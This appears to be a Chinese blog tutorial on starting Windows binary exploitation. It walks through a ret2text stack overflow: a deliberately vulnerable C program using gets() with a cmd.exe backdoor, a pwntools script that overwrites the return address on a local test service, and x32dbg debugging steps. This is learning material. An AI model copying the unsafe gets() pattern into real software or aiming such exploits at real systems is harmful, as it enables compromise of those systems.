<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"default"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="前言这篇关于 Windows Pwn 入门的草稿应该是在 24 年初的时候写的，当时忘记因为什么原因搁置了。时间转眼已经到了 24 年底，这一年经历了挺多意料之外的事情，所以感觉时间过的飞快。今天整理了一下之前写的草稿，算是再水一篇博客。 在 Linux 下的二进制漏洞利用已经较为熟悉的情况下，打算去了解一下 Windows 下的 PWN 。当时本意是希望在大三结束找实习时，可以对 Windows">
<meta property="og:type" content="article">
<meta property="og:title" content="教练 我也想入门windows pwn">
<meta property="og:url" content="https://zikh26.github.io/posts/f671ae0d.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="前言这篇关于 Windows Pwn 入门的草稿应该是在 24 年初的时候写的，当时忘记因为什么原因搁置了。时间转眼已经到了 24 年底，这一年经历了挺多意料之外的事情，所以感觉时间过的飞快。今天整理了一下之前写的草稿，算是再水一篇博客。 在 Linux 下的二进制漏洞利用已经较为熟悉的情况下，打算去了解一下 Windows 下的 PWN 。当时本意是希望在大三结束找实习时，可以对 Windows">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091057489.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091046783.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091103656.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091107575.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091950101.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091956903.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091957456.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091958293.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091958974.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092005655.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092007400.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092008776.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092010193.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092013275.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092017695.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092030677.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092031053.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092032979.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325233320278.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325233216490.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325233716030.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325234108163.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324112219021.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324113735479.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324114031506.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324173126201.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152404283.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152426641.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152526621.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152413841.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152328579.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322160516896.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324180212341.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324180449107.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324181108465.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324181745856.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324181932374.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324182254918.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323202626595.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323202218137.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323203127182.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323203607041.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323210310637.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323210543053.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323211605343.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323230837806.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323231258275.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323233759018.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323234328781.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323234604692.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323235442691.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323235602941.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323235844469.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324001017015.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325102510607.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325110649724.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328111721770.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328125151982.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328131533313.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328144547951.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328144611047.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328154129097.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328155055711.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328171612752.png">
<meta property="article:published_time" content="2024-11-17T08:39:56.705Z">
<meta property="article:modified_time" content="2024-11-17T08:40:26.344Z">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="windows_pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091057489.png">


<link rel="canonical" href="https://zikh26.github.io/posts/f671ae0d.html">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://zikh26.github.io/posts/f671ae0d.html","path":"posts/f671ae0d.html","title":"教练 我也想入门windows pwn"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>教练 我也想入门windows pwn | ZIKH26's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">ZIKH26's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-友链"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windows%E4%B8%8B%E7%9A%84-ret2text"><span class="nav-number">2.</span> <span class="nav-text">windows下的 ret2text</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95"><span class="nav-number">2.1.</span> <span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3"><span class="nav-number">3.</span> <span class="nav-text">报错解决</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#windows%E4%B8%8Bgcc%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F%E6%8A%A5%E9%94%99"><span class="nav-number">3.1.</span> <span class="nav-text">windows下gcc编译32位程序报错</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E-Windows-%E4%B8%8B%E7%9A%84-ASLR-%E6%9C%BA%E5%88%B6"><span class="nav-number">4.</span> <span class="nav-text">关于 Windows 下的 ASLR 机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%B7%E5%9B%A0%EF%BC%9A%E7%96%91%E9%97%AE%E7%9A%84%E4%BA%A7%E7%94%9F"><span class="nav-number">4.1.</span> <span class="nav-text">起因：疑问的产生</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A2%E7%B4%A2"><span class="nav-number">4.2.</span> <span class="nav-text">探索</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%80%83"><span class="nav-number">4.3.</span> <span class="nav-text">思考</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x32dbg%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C"><span class="nav-number">5.</span> <span class="nav-text">x32dbg简单操作</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE"><span class="nav-number"></span> <span class="nav-text">相关题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#root-me-PE32-Stack-buffer-overflow-avance"><span class="nav-number">1.</span> <span class="nav-text">root-me PE32 - Stack buffer overflow avancé</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">1.1.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E8%B0%83%E8%AF%95%E9%97%AE%E9%A2%98"><span class="nav-number">1.2.</span> <span class="nav-text">解决调试问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">1.4.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2024NKCTF-%E6%9D%A5%E7%AD%BE%E4%B8%AA%E5%88%B0"><span class="nav-number">2.</span> <span class="nav-text">2024NKCTF_来签个到</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5"><span class="nav-number">2.1.</span> <span class="nav-text">保护策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">2.3.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-amp-amp-%E6%89%93%E9%80%9A%E6%9C%AC%E5%9C%B0"><span class="nav-number">2.4.</span> <span class="nav-text">调试&amp;&amp;打通本地</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%BF%9C%E7%A8%8B"><span class="nav-number">2.5.</span> <span class="nav-text">攻击远程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-1"><span class="nav-number">2.6.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF2020-easyoverflow"><span class="nav-number">3.</span> <span class="nav-text">强网杯2020_easyoverflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-number">3.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">3.2.</span> <span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-2"><span class="nav-number">3.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">4.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ZIKH26"
      src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
  <p class="site-author-name" itemprop="name">ZIKH26</p>
  <div class="site-description" itemprop="description">人生如戏</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">117</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">117</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/f671ae0d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="人生如戏">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="教练 我也想入门windows pwn | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          教练 我也想入门windows pwn
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-11-17 16:39:56 / 修改时间：16:40:26" itemprop="dateCreated datePublished" datetime="2024-11-17T16:39:56+08:00">2024-11-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98WP/" itemprop="url" rel="index"><span itemprop="name">赛题WP</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98WP/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇关于 <strong>Windows Pwn</strong> 入门的草稿应该是在 24 年初的时候写的，当时忘记因为什么原因搁置了。时间转眼已经到了 24 年底，这一年经历了挺多意料之外的事情，所以感觉时间过的飞快。今天整理了一下之前写的草稿，算是再水一篇博客。</p>
<p>在 <strong>Linux</strong> 下的二进制漏洞利用已经较为熟悉的情况下，打算去了解一下 <strong>Windows</strong> 下的 <strong>PWN</strong> 。当时本意是希望在大三结束找实习时，可以对 <strong>Windows</strong> 平台的二进制方面漏洞利用有更多了解，但回过头来看，其实也没用上🥲。</p>
<span id="more"></span>

<h2 id="windows下的-ret2text"><a href="#windows下的-ret2text" class="headerlink" title="windows下的 ret2text"></a>windows下的 ret2text</h2><p>编写一份存在溢出漏洞和后门函数的代码，编译后进行分析、调试和利用，通过这个过程来对 <code>windows</code> 下的漏洞利用有一个基本认知</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -m32 test.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;C:\\Windows\\system32\\cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input &gt;&gt;&quot;</span>);</span><br><span class="line">        gets(buf);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;data: %s\n&quot;</span>, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在 <code>github</code> 上有一个项目用来检测可执行文件（支持 <code>ELF</code> 和 <code>PE</code> ）的保护机制，在 <a target="_blank" rel="noopener" href="https://github.com/Wenzel/checksec.py/releases/tag/v0.7.1">这里</a> 可以直接下载 <code>checksec.exe</code> ，使用方法 <code>checksec.exe &lt;file_or_directory&gt;</code> 。用该工具检测下上面编译出来程序的安全属性</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091057489.png" alt="image-20240309105757431"></p>
<p>在 <code>main</code> 函数的伪代码部分和源代码没有太大区别，而和 <code>Linux</code> 下明显不一样的地方是左侧的函数栏，出现了很多非自定义函数（去符号，没去符号的都有）。<code>Linux</code> 函数中虽然也有额外的函数但比 <code>windows</code> 下编译出来的少了很多。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091046783.png" alt="image-20240309104632628"></p>
<p>在漏洞利用的过程中，调试是极其重要的一环。调试大概又分成两种，分别从头开始调试程序和附加进程调试。后者在漏洞利用和验证时使用的更频繁一些，常常要配合 <code>python</code> 编写的攻击脚本在发送数据前后附加到进程上调试。</p>
<p>以编写上面代码的攻击脚本为例，进行附加进程调试的操作。</p>
<p><code>gets</code> 读入数据到 <code>v4</code> ，其距离返回地址为 <code>0x10+0x4</code> 字节</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091103656.png" alt="image-20240309110329592"></p>
<p>在垃圾数据后面填入后门函数的地址 <code>0x00401410</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091107575.png" alt="image-20240309110749504"></p>
<p>可以编写如下 <code>EXP</code> ，解释下这个 <code>remote</code> ，这里使用了 <code>Ex</code> 师傅编写的工具 <a target="_blank" rel="noopener" href="https://github.com/Ex-Origin/win_server">win_server</a> ，该工具可以将程序启动并映射在指定端口上。和部署 <code>pwn</code> 题类似，用 <code>nc</code> 或者 <code>pwntools</code> 中的 <code>remote</code> 函数可以和挂起的程序进行交互。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(<span class="number">0x00401410</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>数据发送后发现没打通</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091950101.png" alt="image-20240309195033732"></p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>我选择用 <code>x32dbg</code> 进行的调试，因为我在 <code>exp</code> 中发送 <code>payload</code> 之前使用了 <code>pause</code> 。此时目标进程也被阻塞了，所以第一步就是先运行 <code>exp</code> 并用 <code>pause</code> 卡住</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091956903.png" alt="image-20240309195658678"></p>
<p>在 <code>x32dbg</code> 中选择附加</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091957456.png" alt="image-20240309195720377"></p>
<p>搜索后确定 <code>test</code> 进程号为 <code>41380</code> ，点击附加</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091958293.png" alt="image-20240309195804217"></p>
<p>加载到进程后，调试器界面如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091958974.png" alt="image-20240309195858776"></p>
<p>最初我发现无论如何 <code>x32dbg</code> 也无法调试到 <code>test</code> 程序的代码段，加之该调试器刚开始用，不太熟悉。因此就用了一个比较笨的方法，去搜索程序中出现的字符串 <code>input &gt;&gt;</code> （后来知道 <code>ctrl+g</code> 可以直接跳转至指定地址处）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092005655.png" alt="image-20240309200524449"></p>
<p>经过过滤后可以查看到 <code>input &gt;&gt;</code> 字符串地址为 <code>0x40143F</code> ，双击进行跳转</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092007400.png" alt="image-20240309200734233"></p>
<p>此时已经显示出了程序的代码段，去寻找一个合适的断点位置。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092008776.png" alt="image-20240309200818584"></p>
<p>我选择将断点下到 <code>printf(&quot;data: %s\n&quot;, v4)</code> 这行代码的 <code>call</code> 指令处，点击该地址，按 <code>F2</code> 当地址标红时，说明断点下成功了。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092010193.png" alt="image-20240309201026086"></p>
<p>此时要将 <code>exp</code> 的 <code>pause</code> 取消，<code>payload</code> 才能发送，不然进程还是会一直处于阻塞状态。当程序读取到输入后，会一直运行，直到遇见下的断点后停止。此时发现 <code>EIP</code> 寄存器已经变成了断点处的地址</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092013275.png" alt="image-20240309201311166"></p>
